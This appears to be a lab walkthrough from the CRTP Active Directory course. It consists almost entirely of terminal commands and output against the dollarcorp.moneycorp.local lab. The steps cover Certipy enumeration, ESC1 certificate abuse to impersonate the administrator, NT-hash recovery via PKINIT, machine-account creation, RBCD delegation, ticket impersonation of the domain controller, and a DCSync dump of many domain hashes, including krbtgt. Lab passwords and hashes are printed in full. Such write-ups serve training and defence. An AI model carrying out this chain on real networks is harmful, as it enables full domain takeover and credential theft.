- Enumeration
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy find -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -vulnerable -enabled -dc-ip 172.16.2.1 -stdout
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'moneycorp-MCORP-DC-CA'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-512'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-519'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-500'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : moneycorp-MCORP-DC-CA
    DNS Name                            : mcorp-dc.moneycorp.local
    Certificate Subject                 : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
    Certificate Serial Number           : 48D51C5ED50124AF43DB7A448BF68C49
    Certificate Validity Start          : 2022-11-26 09:59:16+00:00
    Certificate Validity End            : 2032-11-26 10:09:15+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled                                                                                                                                                                                           
    Permissions                                                                                                                                                                                                                             
      Owner                             : DOLLARCORP.MONEYCORP.LOCAL\Administrators                                                                                                                                                         
      Access Rights                                                                                                                                                                                                                         
        ManageCa                        : DOLLARCORP.MONEYCORP.LOCAL\Administrators                                                                                                                                                         
                                          S-1-5-21-335606122-960912869-3279953914-512                                                                                                                                                       
                                          S-1-5-21-335606122-960912869-3279953914-519                                                                                                                                                       
        ManageCertificates              : DOLLARCORP.MONEYCORP.LOCAL\Administrators                                                                                                                                                         
                                          S-1-5-21-335606122-960912869-3279953914-512                                                                                                                                                       
                                          S-1-5-21-335606122-960912869-3279953914-519                                                                                                                                                       
        Enroll                          : DOLLARCORP.MONEYCORP.LOCAL\Authenticated Users                                                                                                                                                    
    [!] Vulnerabilities                                                                                                                                                                                                                     
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022                                                                                                   
Certificate Templates                                                                                                                                                                                                                       
  0                                                                                                                                                                                                                                         
    Template Name                       : HTTPSCertificates                                                                                                                                                                                 
    Display Name                        : HTTPSCertificates                                                                                                                                                                                 
    Certificate Authorities             : moneycorp-MCORP-DC-CA                                                                                                                                                                             
    Enabled                             : True                                                                                                                                                                                              
    Client Authentication               : True                                                                                                                                                                                              
    Enrollment Agent                    : False                                                                                                                                                                                             
    Any Purpose                         : False                                                                                                                                                                                             
    Enrollee Supplies Subject           : True                                                                                                                                                                                              
    Certificate Name Flag               : EnrolleeSuppliesSubject                                                                                                                                                                           
    Enrollment Flag                     : IncludeSymmetricAlgorithms                                                                                                                                                                        
                                          PublishToDs                                                                                                                                                                                       
    Private Key Flag                    : ExportableKey                                                                                                                                                                                     
    Extended Key Usage                  : Client Authentication                                                                                                                                                                             
                                          Secure Email                                                                                                                                                                                      
                                          Encrypting File System                                                                                                                                                                            
    Requires Manager Approval           : False                                                                                                                                                                                             
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DOLLARCORP.MONEYCORP.LOCAL\RDP Users
                                          S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                           : S-1-5-21-335606122-960912869-3279953914-500
        Write Owner Principals          : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Dacl Principals           : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Property Principals       : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
    [!] Vulnerabilities
      ESC1                              : 'DOLLARCORP.MONEYCORP.LOCAL\\RDP Users' can enroll, enrollee supplies subject and template allows client authentication
  1
    Template Name                       : SmartCardEnrollment-Agent
    Display Name                        : SmartCardEnrollment-Agent
    Certificate Authorities             : moneycorp-MCORP-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DOLLARCORP.MONEYCORP.LOCAL\Domain Users
                                          S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
      Object Control Permissions
        Owner                           : S-1-5-21-335606122-960912869-3279953914-500
        Write Owner Principals          : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Dacl Principals           : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
        Write Property Principals       : S-1-5-21-335606122-960912869-3279953914-512
                                          S-1-5-21-335606122-960912869-3279953914-519
                                          S-1-5-21-335606122-960912869-3279953914-500
    [!] Vulnerabilities
      ESC3                              : 'DOLLARCORP.MONEYCORP.LOCAL\\Domain Users' can enroll and template has Certificate Request Agent EKU set

```

```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy find -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -vulnerable -enabled -dc-ip 172.16.2.1 -old-bloodhound
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 15 enabled certificate templates
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'moneycorp-MCORP-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'moneycorp-MCORP-DC-CA'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-500'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-512'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-519'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-498'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-516'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-553'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-515'
[!] Failed to lookup user with SID 'S-1-5-21-335606122-960912869-3279953914-513'
[*] Saved BloodHound data to '20230806211009_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @BloodHoundAD
```

- Exploitation
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy req -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -target 'mcorp-dc.moneycorp.local' -ca 'moneycorp-mcorp-dc-ca' -template 'HTTPSCertificates' -upn 'administrator@dollarcorp.moneycorp.local'
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 22
[*] Got certificate with UPN 'Administrator@dollarcorp.moneycorp.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

- Request a TGT and retrieve NT hash of `dcorp\administrator` using `certipy`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'dollarcorp.moneycorp.local' -dc-ip 172.16.2.1                                                      Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@dollarcorp.moneycorp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@dollarcorp.moneycorp.local': aad3b435b51404eeaad3b435b51404ee:af0686cc0ca8f04df42210c9ac980760
```

- Request a TGT and retrieve NT hash of `dcorp\administrator` using `PKINITtools`.
1. Request a TGT using `gettgtpkinit.py`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/PKINITtools]
└─# python3 gettgtpkinit.py -cert-pfx ../administrator.pfx dollarcorp.moneycorp.local/Administrator Administrator.ccache -dc-ip 172.16.2.1 
2023-08-22 20:18:31,604 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-08-22 20:18:31,757 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-08-22 20:18:32,452 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-08-22 20:18:32,452 minikerberos INFO     c831dc05af6f9df1b741a16706e218f35953cc6f87eb502cc16866c24779d9fb
INFO:minikerberos:c831dc05af6f9df1b741a16706e218f35953cc6f87eb502cc16866c24779d9fb
2023-08-22 20:18:32,459 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

2. Request a TGT using `getnthash.py`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/PKINITtools]
└─# export KRB5CCNAME=Administrator.ccache 


┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/MixedAttack/dollarcorp.moneycorp.local/PKINITtools]
└─# python3 getnthash.py -key c831dc05af6f9df1b741a16706e218f35953cc6f87eb502cc16866c24779d9fb -dc-ip 172.16.2.1 dollarcorp.moneycorp.local/Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
af0686cc0ca8f04df42210c9ac980760
```

### Alternative way to use the generated `administrator.pfx` - [[Certrified]]###

- Check the `MachineAccountQuota` of an owned user, in case we do not already control a machine account.
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# bloodyAD -d dollarcorp.moneycorp.local -u student303 -p 'a5fdNPDwScrD7T2A' --host 172.16.2.1 get object 'DC=dollarcorp,DC=moneycorp,DC=local' --attr ms-DS-MachineAccountQuota 

distinguishedName: DC=dollarcorp,DC=moneycorp,DC=local
ms-DS-MachineAccountQuota: 10
```

- Add a new computer to the domain.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# impacket-addcomputer dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A -computer-name 'WS01$' -computer-pass 'Password123!' 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account WS01$ with password Password123!.
```

- Set the attribute `dNSHostName` (empty when we created the object) to match the Domain Controller DNS Hostname.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# bloodyAD -d dollarcorp.moneycorp.local -u student303 -p 'a5fdNPDwScrD7T2A' --host 172.16.2.1 set object 'CN=WS01,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local' dNSHostName -v 'DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL'

[+] CN=WS01,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local's dnsHostName has been updated
```

- Check if the attribute has been correctly set.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# bloodyAD -d dollarcorp.moneycorp.local -u student303 -p 'a5fdNPDwScrD7T2A' --host 172.16.2.1 get object 'CN=WS01,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local' --attr dNSHostName                             

distinguishedName: CN=WS01,CN=Computers,DC=dollarcorp,DC=moneycorp,DC=local
dNSHostName: DCORP-DC.dollarcorp.moneycorp.local
```

- RBCD technique with [bloodyAD](https://github.com/CravateRouge/bloodyAD) and its certificate authentication feature.
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# openssl pkcs12 -in administrator.pfx -out administrator.pem -nodes
Enter Import Password: <PRESS ENTER>
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# bloodyAD -d dollarcorp.moneycorp.local  -c ":administrator.pem" -u 'WS01$' --host 172.16.2.1 add rbcd 'DCORP-DC$' 'WS01$'

[+] WS01$ SID is: S-1-5-21-1945936656-2616711065-1665664270-1134             
[+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set        
[+] Delegation rights modified successfully!                                                                           
WS01$ can now impersonate users on DCORP-DC$ via S4U2Proxy
```

- Delegation rights are set up, we can now use [impacket](https://github.com/SecureAuthCorp/impacket) `getST` to impersonate a Domain admin (Administrator in our case) on DCORP-DC$ and fetch a TGT.
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# impacket-getST -spn LDAP/DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL -impersonate 'DCORP-DC$' -dc-ip 172.16.2.1 'dollarcorp.moneycorp.local/WS01$:Password123!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DCORP-DC$
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in DCORP-DC$.ccache
```

- Use the exported TGT to perform a DCSync attack with [impacket](https://github.com/SecureAuthCorp/impacket) `secretsdump`
```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# export KRB5CCNAME=DCORP-DC\$.ccache
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/LinuxAttack/dollarcorp.moneycorp.local/Exploitation/krbrelayx]
└─# impacket-secretsdump 'dollarcorp.moneycorp.local/dcorp-dc$'@DCORP-DC -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:af0686cc0ca8f04df42210c9ac980760:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e9815869d2090ccfca61c1fe0d23986:::
sqladmin\sqladmin:1113:aad3b435b51404eeaad3b435b51404ee:07e8be316e3da9a042a9cb681df19bf5:::
websvc\websvc:1114:aad3b435b51404eeaad3b435b51404ee:cc098f204c5887eaa8253e7c2749156f:::
srvadmin\srvadmin:1115:aad3b435b51404eeaad3b435b51404ee:a98e18228819e8eec3dfa33cb68b0728:::
appadmin\appadmin:1117:aad3b435b51404eeaad3b435b51404ee:d549831a955fee51a43c83efb3928fa7:::
svcadmin\svcadmin:1118:aad3b435b51404eeaad3b435b51404ee:b38ff50264b74508085d82c69794a4d8:::
testda\testda:1119:aad3b435b51404eeaad3b435b51404ee:a16452f790729fa34e8f3a08f234a82c:::
mgmtadmin\mgmtadmin:1120:aad3b435b51404eeaad3b435b51404ee:95e2cd7ff77379e34c6e46265e75d754:::
ciadmin\ciadmin:1121:aad3b435b51404eeaad3b435b51404ee:e08253add90dccf1a208523d02998c3d:::
sql1admin\sql1admin:1122:aad3b435b51404eeaad3b435b51404ee:e999ae4bd06932620a1e78d2112138c6:::

<snip>
